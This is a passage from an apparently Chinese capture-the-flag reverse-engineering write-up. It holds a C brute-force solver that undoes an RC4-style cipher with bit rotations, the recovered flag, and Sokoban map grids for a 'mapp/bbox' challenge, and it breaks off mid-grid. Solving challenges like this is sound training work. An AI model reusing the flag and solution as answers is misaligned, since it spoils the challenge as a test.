class="number">0x9c</span>, <span class="number">0x66</span>, <span class="number">0x03</span>, <span class="number">0x6c</span>, <span class="number">0x93</span>, <span class="number">0xe6</span>, <span class="number">0x24</span>, <span class="number">0x84</span>, <span class="number">0x3c</span>, <span class="number">0x7b</span>, <span class="number">0xf0</span>, <span class="number">0x02</span>, <span class="number">0xb0</span>, <span class="number">0x5b</span>, <span class="number">0xbd</span>, <span class="number">0x6a</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x38</span>, <span class="number">0x12</span>, <span class="number">0xc0</span>, <span class="number">0x47</span>, <span class="number">0x1b</span>, <span class="number">0x01</span>, <span class="number">0x9b</span>, <span class="number">0x61</span>, <span class="number">0x04</span>, <span class="number">0x6b</span>, <span class="number">0x94</span>, <span class="number">0xe1</span>, <span class="number">0x23</span>, <span class="number">0x83</span>, <span class="number">0x3b</span>, <span class="number">0x7c</span>, <span class="number">0xf7</span>, <span class="number">0x05</span>, <span class="number">0xb7</span>, <span class="number">0x5c</span>, <span class="number">0xba</span>, <span class="number">0x6d</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x39</span>, <span class="number">0x13</span>, <span class="number">0xc1</span>, <span class="number">0x46</span>, <span class="number">0x1a</span>, <span class="number">0x00</span>, <span class="number">0x9a</span>, <span class="number">0x60</span>, <span class="number">0x05</span>, <span class="number">0x6a</span>, <span class="number">0x95</span>, <span class="number">0xe0</span>, <span class="number">0x22</span>, <span class="number">0x82</span>, <span class="number">0x3a</span>, <span class="number">0x7d</span>, <span class="number">0xf6</span>, <span class="number">0x04</span>, <span class="number">0xb6</span>, <span class="number">0x5d</span>, <span class="number">0xbb</span>, <span class="number">0x6c</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x3a</span>, <span class="number">0x10</span>, <span class="number">0xc2</span>, <span class="number">0x45</span>, <span class="number">0x19</span>, <span class="number">0x03</span>, <span class="number">0x99</span>, <span class="number">0x63</span>, <span class="number">0x06</span>, <span class="number">0x69</span>, <span class="number">0x96</span>, <span class="number">0xe3</span>, <span class="number">0x21</span>, <span class="number">0x81</span>, <span class="number">0x39</span>, <span class="number">0x7e</span>, <span class="number">0xf5</span>, <span class="number">0x07</span>, <span class="number">0xb5</span>, <span class="number">0x5e</span>, <span class="number">0xb8</span>, <span class="number">0x6f</span> &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> flag[<span class="number">23</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">memcpy</span>(Sbak2, S, <span class="number">256</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> lasti = <span class="number">0</span>; lasti &lt; <span class="number">256</span>; lasti++)</span><br><span class="line">&#123;</span><br><span class="line">ZeroMemory(flag, <span class="number">23</span>);</span><br><span class="line"><span class="built_in">memcpy</span>(S, Sbak2, <span class="number">256</span>);</span><br><span class="line">k = l = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j != <span class="number">22</span>; ++j)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">memcpy</span>(Sbak, S, <span class="number">256</span>);</span><br><span class="line"><span class="type">int</span> kbak = k;</span><br><span class="line"><span class="type">int</span> lbak = l;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">unsigned</span> <span class="type">char</span> e = <span class="number">32</span>; e &lt; <span class="number">129</span>; e++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">memcpy</span>(S, Sbak, <span class="number">256</span>);</span><br><span class="line">k = kbak;</span><br><span class="line">l = lbak;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">m = (<span class="type">unsigned</span> __int8)S[(<span class="type">unsigned</span> __int8)++k];</span><br><span class="line">l += m;</span><br><span class="line">S[(<span class="type">unsigned</span> __int8)k] = S[(<span class="type">unsigned</span> __int8)l];</span><br><span class="line">S[(<span class="type">unsigned</span> __int8)l] = m;</span><br><span class="line">BYTE v3 = ((((<span class="type">unsigned</span> __int8)(e &lt;&lt; <span class="number">7</span>) | (e &gt;&gt; <span class="number">1</span>)) &lt;&lt; <span class="number">6</span>) ^ <span class="number">0xC0</span> | ((<span class="type">unsigned</span> __int8)((e &lt;&lt; <span class="number">7</span>) | (e &gt;&gt; <span class="number">1</span>)) &gt;&gt; <span class="number">2</span>) ^ <span class="number">0x3B</span>) ^ <span class="number">0xBE</span>;</span><br><span class="line">out[j] = S[(<span class="type">unsigned</span> __int8)(S[(<span class="type">unsigned</span> __int8)k] + m)] ^ key2[j &amp; <span class="number">3</span>] ^ (((<span class="type">unsigned</span> __int8)(((<span class="number">16</span> * (((<span class="number">32</span> * v3) | (v3 &gt;&gt; <span class="number">3</span>)) ^ <span class="number">0xAD</span>)) | ((<span class="type">unsigned</span> __int8)(((<span class="number">32</span> * v3) | (v3 &gt;&gt; <span class="number">3</span>)) ^ <span class="number">0xAD</span>) &gt;&gt; <span class="number">4</span>)) ^ <span class="number">0xDE</span>) &gt;&gt; <span class="number">5</span>) | (<span class="number">8</span> * (((<span class="number">16</span> * (((<span class="number">32</span> * v3) | (v3 &gt;&gt; <span class="number">3</span>)) ^ <span class="number">0xAD</span>)) | ((<span class="type">unsigned</span> __int8)(((<span class="number">32</span> * v3) | (v3 &gt;&gt; <span class="number">3</span>)) ^ <span class="number">0xAD</span>) &gt;&gt; <span class="number">4</span>)) ^ <span class="number">0xDE</span>)));</span><br><span class="line"><span class="keyword">if</span> (out[j] == last[lasti][j]) &#123;</span><br><span class="line">flag[j] = e;</span><br><span class="line"><span class="comment">//printf(&quot;%c &quot;, e);</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">strlen</span>(flag) == <span class="number">22</span> &amp;&amp; flag[<span class="number">21</span>] == <span class="string">&#x27;&#125;&#x27;</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, flag);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;<span class="symbol">QeMu_r3v3rs3in9_h@</span>ck6&#125;</span><br></pre></td></tr></table></figure><h2 id="mapp-bbox">mapp/bbox</h2><p>一个简单的推箱子，很简单，直接手算即可</p><p>可以直接到最后看输出得到提示</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">k = &#x27;&#x27;&#x27;</span><br><span class="line"><span class="number">11111111111111</span><span class="number">111111</span></span><br><span class="line"><span class="number">11111111111111</span><span class="number">111111</span></span><br><span class="line"><span class="number">11411111111111</span><span class="number">111111</span></span><br><span class="line"><span class="number">11030011111111</span><span class="number">111111</span></span><br><span class="line"><span class="number">11011011111111</span><span class="number">111111</span></span><br><span class="line"><span class="number">00000211111111</span><span class="number">111111</span></span><br><span class="line"><span class="number">11101111111111</span><span class="number">111111</span></span><br><span class="line"><span class="number">11101111111111</span><span class="number">111111</span></span><br><span class="line"><span class="number">01100110001000</span><span class="number">100010</span></span><br><span class="line"><span class="number">01000000001000</span><span class="number">100010</span></span><br><span class="line"><span class="number">01000000001000</span><span class="number">111110</span></span><br><span class="line"><span class="number">01111111111000</span><span class="number">000010</span></span><br><span class="line"><span class="number">00000000001000</span><span class="number">000010</span></span><br><span class="line"><span class="number">00001111111000</span><span class="number">111110</span></span><br><span class="line"><span class="number">00001000001000</span><span class="number">100010</span></span><br><span class="line"><span class="number">01111000001000</span><span class="number">100010</span></span><br><span class="line"><span class="number">01000000001111</span><span class="number">100010</span></span><br><span class="line"><span class="number">01000000000000</span><span class="number">000010</span></span><br><span class="line"><span class="number">01000000001111</span><span class="number">100010</span></span><br><span class="line"><span class="number">01000000000000</span><span class="number">000010</span></span><br><span class="line"></span><br><span class="line"><span class="number">00000000000000</span><span class="number">000000</span></span><br><span class="line"><span class="number">01111111111111</span><span class="number">111110</span></span><br><span class="line"><span class="number">01000000000000</span><span class="number">000010</span></span><br><span class="line"><span class="number">01200300040000</span><span class="number">000010</span></span><br><span class="line"><span class="number">01000000000000</span><span class="number">000010</span></span><br><span class="line"><span class="number">01111111111111</span><span class="number">101110</span></span><br><span class="line"><span class="number">01000000000000</span><span class="number">000010</span></span><br><span class="line"><span class="number">01000011111000</span><span class="number">111110</span></span><br><span class="line"><span class="number">01000010001000</span><span class="number">100010</span></span><br><span class="line"><span class="number">01111110001000</span><span class="number">100010</span></span><br><span class="line"><span class="number">00000010000000</span><span class="number">100010</span></span><br><span class="line"><span class="number">00111110001000</span><span class="number">111110</span></span><br><span class="line"><span class="number">00100000001000</span><span class="number">000010</span></span><br><span class="line"><span class="number">00100010111000</span><span class="number">111110</span></span><br><span class="line"><span class="number">00100030001000</span><span class="number">100010</span></span><br><span class="line"><span class="number">00111100001000</span><span class="number">100010</span></span><br><span class="line"><span class="number">00400000001000</span><span class="number">100010</span></span><br><span class="line"><span class="number">01111111111000</span><span class="number">100010</span></span><br><span class="line"><span class="number">01000000000000</span><span class="number">000010</span></span><br><span class="line"><span class="number">01000000000000</span><span class="number">000010</span></span><br><span class="line"></span><br><span class="line"><span class="number">11111111111111</span><span class="number">111111</span></span><br><span class="line"><span class="number">14000000000000</span><span class="number">000001</span></span><br><span class="line"><span class="number">10111111111111</span><span class="number">100001</span></span><br><span class="line"><span class="number">10100000000000</span><span class="number">100001</span></span><br><span class="line"><span class="number">10100000000000</span><span class="number">100001</span></span><br><span class="line"><span class="number">10103000000000</span><span class="number">100001</span></span><br><span class="line"><span class="number">10111011101111</span><span class="number">100001</span></span><br><span class="line"><span class="number">10000000000000</span><span class="number">000001</span></span><br><span class="line"><span class="number">10111111111111</span><span class="number">011111</span></span><br><span class="line"><span class="number">10000000100000</span><span class="number">000001</span></span><br><span class="line"><span class="number">10000000000000</span><span class="number">001001</span></span><br><span class="line"><span class="number">10000000100000</span><span class="number">001001</span></span><br><span class="line"><span class="number">11111111100000</span><span class="number">001001</span></span><br><span class="line"><span class="number">10000000000000</span><span class="number">002001</span></span><br><span class="line"><span class="number">11111111111111</span><span class="number">111111</span></span><br><span class="line"><span class="number">00000000000000</span><span class="number">000000</span></span><br><span class="line"><span class="number">00000000000000</span><span class="number">000000</span></span><br><span class="line"><span class="number">00000000000000</span><span class="number">000000</span></span><br><span class="line"><span class="number">00000000000000</span><span class="number">000000</span></span><br><span class="line"><span class="number">00000000000000</span><span class="number">000000</span></span><br><span class="line"></span><br><span class="line"><span class="number">11111111111111</span><span class="number">111111</span></span><br><span class="line"><span class="number">14000000000000</span><span class="number">000001</span></span><br><span class="line"><span class="number">10000001111111</span><span class="number">000001</span></span><br><span class="line"><span class="number">10000000300001</span><span class="number">000001</span></span><br><span class="line"><span class="number">10000001000001</span><span class="number">000001</span></span><br><span class="line"><span class="number">10000001000021</span><span class="number">000001</span></span><br><span class="line"><span class="number">10000001111111</span><span class="number">000001</span></span><br><span class="line"><span class="number">10000000000000</span><span class="number">000001</span></span><br><span class="line"><span class="number">11111111111111</span><span class="number">111111</span></span><br><span class="line"><span class="number">10000000100000</span><span class="number">000001</span></span><br><span class="line"><span class="number">10000000100000</span><span class="number">000111</span></span><br><span class="line"><span class="number">10000000100000</span><span class="number">000100</span></span><br><span class="line"><span class="number">10111111100000</span><span class="number">000100</span></span><br><span class="line"><span class="number">10000000000000</span><span class="number">000100</span></span><br><span class="line"><span class="number">11111111111111</span><span class="number">111111</span></span><br><span class="line"><span class="number">00000000000000</span><span class="number">000000</span></span><br><span class="line"><span class="number">00000000000000</span><span class="number">000000</span></span><br><span class="line"><span class="number">00000000000000</span><span class="number">000000</span></span><br><span class="line"><span class="number">00000000000000</span><span class="number">000000</span></span><br><span class="line"><span class="number">00000000000000</span><span class="number">000000</span></span><br><span class="line"></span><br><span class="line"><span class="number">11111111111111</span><span class="number">111111</span></span><br><span class="line"><span class="number">10000000000000</span><span class="number">000001</span></span><br><span class="line"><span class="number">10111111111111</span><span class="number">111001</span></span><br><span class="line"><span class="number">10100000000000</span><span class="number">001001</span></span><br><span class="line"><span class="number">10101111111111</span><span class="number">111001</span></span><br><span class="line"><span class="number">10101000000000</span><span class="number">001001</span></span><br><span class="line"><span class="number">10101011111111</span><span class="number">111001</span></span><br><span class="line"><span class="number">10101010000000</span><span class="number">000001</span></span><br><span class="line"><span class="number">10101010111111</span><span class="number">111101</span></span><br><span class="line"><span class="number">10001000100000</span><span class="number">000001</span></span><br><span class="line"><span class="number">11111111111111</span><span class="number">111111</span></span><br><span class="line"><span class="number">10000000000000</span><span class="number">100001</span></span><br><span class="line"><span class="number">10000001111111</span><span class="number">101101</span></span><br><span class="line"><span class="number">10000001000000</span><span class="number">001001</span></span><br><span class="line"><span class="number">11111111111111</span><span class="number">111111</span></span><br><span class="line"><span class="number">10000000000000</span><span class="number">040001</span></span><br><span class="line"><span class="number">10000001111111</span><span class="number">110101</span></span><br><span class="line"><span class="number">10000000000000</span><span class="number">300001</span></span><br><span class="line"><span class="number">11111011111111</span><span class="number">101111</span></span><br><span class="line"><span class="number">10000000000000</span><span class="number">020001</span></span><br><span class="line"></span><br><span class="line"><span class="number">11111111111111</span><span class="number">111111</span></span><br><span class="line"><span class="number">14000003000000</span><span class="number">000001</span></span><br><span class="line"><span class="number">10111111111111</span><span class="number">100001</span></span><br><span class="line"><span class="number">10100000002000</span><span class="number">000001</span></span><br><span class="line"><span class="number">10101111111111</span><span class="number">101101</span></span><br><span class="line"><span class="number">10101000001000</span><span class="number">001001</span></span><br><span class="line"><span class="number">10101011111011</span><span class="number">101001</span></span><br><span class="line"><span class="number">10001010001010</span><span class="number">001001</span></span><br><span class="line"><span class="number">10111010101010</span><span class="number">101101</span></span><br><span class="line"><span class="number">10100000000000</span><span class="number">000001</span></span><br><span class="line"><span class="number">11111111111111</span><span class="number">101111</span></span><br><span class="line"><span class="number">10000001000000</span><span class="number">000001</span></span><br><span class="line"><span class="number">10000001111111</span><span class="number">011101</span></span><br><span class="line"><span class="number">10000001000000</span><span class="number">301001</span></span><br><span class="line"><span class="number">11111111400000</span><span class="number">001001</span></span><br><span class="line"><span class="number">10000000000000</span><span class="number">001001</span></span><br><span class="line"><span class="number">10111111111111</span><span class="number">111001</span></span><br><span class="line"><span class="number">10100000000000</span><span class="number">000001</span></span><br><span class="line"><span class="number">11111111111111</span><span class="number">111111</span></span><br><span class="line"><span class="number">10000000000000</span><span class="number">000001</span></span><br><span class="line"></span><br><span class="line"><span class="number">11111111111111</span><span class="number">111111</span></span><br><span class="line"><span class="number">10000010000000</span><span class="number">000001</span></span><br><span class="line"><span class="number">10111111111111</span><span class="number">111001</span></span><br><span class="line"><span class="number">10100000000000</span><span class="number">001001</span></span><br><span class="line"><span class="number">10101111111111</span><span class="number">111001</span></span><br><span class="line"><span class="number">10101000021000</span><span class="number">000001</span></span><br><span class="line"><span class="number">10101011111011</span><span class="number">111101</span></span><br><span class="line"><span class="number">10101010000010</span><span class="number">000001</span></span><br><span class="line"><span class="number">10001010111110</span><span class="number">111101</span></span><br><span class="line"><span class="number">11111010100000</span><span class="number">100001</span></span><br><span class="line"><span class="number">10000010101111</span><span class="number">101101</span></span><br><span class="line"><span class="number">10111110101000</span><span class="number">001001</span></span><br><span class="line"><span class="number">10100000101011</span><span class="number">111001</span></span><br><span class="line"><span class="number">10101111101010</span><span class="number">000001</span></span><br><span class="line"><span class="number">10003000000000</span><span class="number">111111</span></span><br><span class="line"><span class="number">11111011111010</span><span class="number">100001</span></span><br><span class="line"><span class="number">10000000000010</span><span class="number">101111</span></span><br><span class="line"><span class="number">10111111111110</span><span class="number">001001</span></span><br><span class="line"><span class="number">14000000000000</span><span class="number">001001</span></span><br><span class="line"><span class="number">11111111111111</span><span class="number">111111</span></span><br><span class="line"></span><br><span class="line"><span class="number">11111111111111</span><span class="number">111111</span></span><br><span class="line"><span class="number">14000000000002</span><span class="number">003001</span></span><br><span class="line"><span class="number">10111011111111</span><span class="number">111001</span></span><br><span class="line"><span class="number">10100000000000</span><span class="number">000001</span></span><br><span class="line"><span class="number">10101111111011</span><span class="number">111001</span></span><br><span class="line"><span class="number">10101400001000</span><span class="number">001001</span></span><br><span class="line"><span class="number">10101011111010</span><span class="number">101001</span></span><br><span class="line"><span class="number">10101010001010</span><span class="number">101001</span></span><br><span class="line"><span class="number">10101010111010</span><span class="number">101101</span></span><br><span class="line"><span class="number">10003000100000</span><span class="number">000001</span></span><br><span class="line"><span class="number">10111011111111</span><span class="number">111101</span></span><br><span class="line"><span class="number">10000001000010</span><span class="number">000001</span></span><br><span class="line"><span class="number">11111111111111</span><span class="number">111101</span></span><br><span class="line"><span class="number">10003000000000</span><span class="number">041001</span></span><br><span class="line"><span class="number">10111111111111</span><span class="number">111001</span></span><br><span class="line"><span class="number">10100000001000</span><span class="number">000001</span></span><br><span class="line"><span class="number">10101111111011</span><span class="number">111101</span></span><br><span class="line"><span class="number">10101000001000</span><span class="number">001001</span></span><br><span class="line"><span class="number">10101011111111</span><span class="number">111001</span></span><br><span class="line"><span class="number">10000000000000</span><span class="number">000001</span></span><br><span class="line"></span><br><span class="line"><span class="number">11111111111111</span><span class="number">111111</span></span><br><span class="line"><span class="number">10000000000000</span><span class="number">100001</span></span><br><span class="line"><span class="number">10111111111111</span><span class="number">111001</span></span><br><span class="line"><span class="number">10100000000000</span><span class="number">001001</span></span><br><span class="line"><span class="number">10101111111111</span><span class="number">111001</span></span><br><span class="line"><span class="number">10101000000000</span><span class="number">000001</span></span><br><span class="line"><span class="number">10101110111011</span><span class="number">111101</span></span><br><span class="line"><span class="number">10001013001010</span><span class="number">001001</span></span><br><span class="line"><span class="number">11111002111010</span><span class="number">101001</span></span><br><span class="line"><span class="number">10000010100000</span><span class="number">101001</span></span><br><span class="line"><span class="number">10111114101111</span><span class="number">111001</span></span><br><span class="line"><span class="number">10100000001000</span><span class="number">000001</span></span><br><span class="line"><span class="number">10101111101111</span><span class="number">111101</span></span><br><span class="line"><span class="number">10101000000000</span><span class="number">001001</span></span><br><span class="line"><span class="number">10001111111111</span><span class="number">111001</span></span><br><span class="line"><span class="number">11111000000000</span><span class="number">000001</span></span><br><span class="line"><span class="number">10000011111111</span><span class="number">111101</span></span><br><span class="line"><span class="number">10111110000000</span><span class="number">000001</span></span><br><span class="line"><span class="number">10100000000000</span><span class="number">000001</span></span><br><span class="line"><span class="number">11111111111111</span><span class="number">111111</span></span><br><span class="line"></span><br><span class="line"><span class="number">11111111111111</span><span class="number">111111</span></span><br><span class="line"><span class="number">11111111111111</span><span class="number">111111</span></span><br><span class="line"><span class="number">11111111111111</span><span class="number">111111</span></span><br><span class="line"><span class="number">11100000000001</span><span class="number">111111</span></span><br><span class="line"><span class="number">11101111111101</span><span class="number">111111</span></span><br><span class="line"><span class="number">11101111111101</span><span class="number">111111</span></span><br><span class="line"><span class="number">11101111111101</span><span class="number">111111</span></span><br><span class="line"><span class="number">11101111111101</span><span class="number">111111</span></span><br><span class="line"><span class="number">11101111111101</span><span class="number">111111</span></span><br><span class="line"><span class="number">11100000000001</span><span class="number">111111</span></span><br><span class="line"><span class="number">11111111111101</span><span class="number">111111</span></span><br><span class="line"><span class="number">11111111111101</span><span class="number">111111</span></span><br><span class="line"><span class="number">11111111111101</span><span class="number">111111</span></span><br><span class="line"><span class="number">11111111111101</span><span class="number">111111</span></span><br><span class="line"><span class="number">11111111111101</span><span class="number">111111</span></span><br><span class="line"><span class="number">11111111111101</span><span class="number">111111</span></span><br><span class="line"><span class="number">11111111111101</span><span class="number">111111</span></span><br><span class="line"><span class="number">11111111111111</span><span class="number">111111</span></span><br><span class="line"><span class="number">11111111111111</span><span class="number">111111</span></span><br><span class="line"><span class="number">11111111111111</span><span class="number">111111</span></span><br><span class="line"></span><br><span class="line"><span class="number">11111111111111</span><span class="number">111111</span></span><br><span class="line"><span class="number">11111111111111</span><span class="number">111111</span></span><br><span class="line"><span class="number">11111111111111</span><span class="number">111111</span></span><br><span class="line"><span class="number">11111111111111</span><span class="number">111111</span></span><br><span class="line"><span class="number">11011110111101</span><span class="number">111111</span></span><br><span class="line"><span class="number">11011110111101</span><span class="number">111111</span></span><br><span class="line"><span class="number">11011110111101</span><span class="number">111111</span></span><br><span class="line"><span class="number">11011110111101</span><span class="number">111111</span></span><br><span class="line"><span class="number">11011110111101</span><span class="number">111111</span></span><br><span class="line"><span class="number">11101110111011</span><span class="number">111111</span></span><br><span class="line"><span class="number">11101110111011</span><span class="number">111111</span></span><br><span class="line"><span class="number">11101101010111</span><span class="number">111111</span></span><br><span class="line"><span class="number">11110101010111</span><span class="number">111111</span></span><br><span class="line"><span class="number">11110101010111</span><span class="number">111111</span></span><br><span class="line"><span class="number">11111011101111</span><span class="number">111111</span></span><br><span class="line"><span class="number">11111111111111</span><span class="number">111111</span></span><br><span class="line"><span class="number">11111111111111</span><span class="number">111111</span></span><br><span class="line"><span class="number">11111111111111</span><span class="number">111111</span></span><br><span class="line"><span class="number">11111111111111</span><span class="number">111111</span></span><br><span class="line"><span class="number">11111111111111</span><span class="number">111111</span></span><br><span class="line"></span><br><span class="line"><span class="number">11111111111111</span><span class="number">111111</span></span><br><span class="line"><span class="number">11111111111111</span><span class="number">111111</span></span><br><span class="line"><span class="number">11111111111111</span><span class="number">111111</span></span><br><span class="line"><span class="number">11101111111111</span><span class="number">111111</span></span><br><span class="line"><span class="number">11101111111111</span><span class="number">111111</span></span><br><span class="line"><span class="number">11101111111111</span><span class="number">111111</span></span><br><span class="line"><span class="number">11101111111111</span><span class="number">111111</span></span><br><span class="line"><span class="number">11101111111111</span><span class="number">111111</span></span><br><span class="line"><span class="number">11100000000011</span><span class="number">111111</span></span><br><span class="line"><span class="number">11101111111011</span><span class="number">111111</span></span><br><span class="line"><span class="number">11101111111011</span><span class="number">111111</span></span><br><span class="line"><span class="number">11101111111011</span><span class="number">111111</span></span><br><span class="line"><span class="number">11101111111011</span><span class="number">111111</span></span><br><span class="line"><span class="number">11101111111011</span><span class="number">111111</span></span><br><span class="line"><span class="number">11101111111011</span><span class="number">111111</span></span><br><span class="line"><span class="number">11100000000011</span><span class="number">111111</span></span><br><span class="line"><span class="number">11111111111111</span><span class="number">111111</span></span><br><span class="line"><span class="number">11111111111111</span><span class="number">111111</span></span><br><span class="line"><span class="number">11111111111111</span><span class="number">111111</span></span><br><span class="line"><span class="number">11111111111111</span><span class="number">111111</span></span><br><span class="line"></span><br><span class="line"><span class="number">11111111111111</span><span class="number">111111</span></span><br><span class="line"><span class="number">11111111111111</span><span class="number">111111</span></span><br><span class="line"><span class="number">11111110000011</span><span class="number">111111</span></span><br><span class="line"><span class="number">11111110111011</span><span class="number">111111</span></span><br><span class="line"><span class="number">11111110111011</span><span class="number">111111</span></span><br><span class="line"><span class="number">11111110111011</span><span class="number">111111</span></span><br><span class="line"><span class="number">11111110111011</span><span class="number">111111</span></span><br><span class="line"><span 